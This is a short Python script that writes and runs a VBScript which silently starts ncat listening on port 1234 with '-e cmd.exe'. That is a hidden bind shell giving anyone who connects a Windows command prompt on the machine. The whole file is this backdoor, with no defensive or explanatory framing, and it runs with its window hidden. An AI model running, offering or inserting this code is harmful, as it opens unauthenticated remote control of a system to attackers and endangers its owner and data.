import subprocess

# Create a VBScript to run the Netcat command in the background
vbscript_code = '''
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /C ncat -l -p 1234 -e cmd.exe", 0
'''

# Save the VBScript to a temporary file
with open('run_netcat.vbs', 'w') as vbscript_file:
    vbscript_file.write(vbscript_code)

# Run the VBScript to start Netcat in the background
subprocess.call('cscript run_netcat.vbs', shell=True)
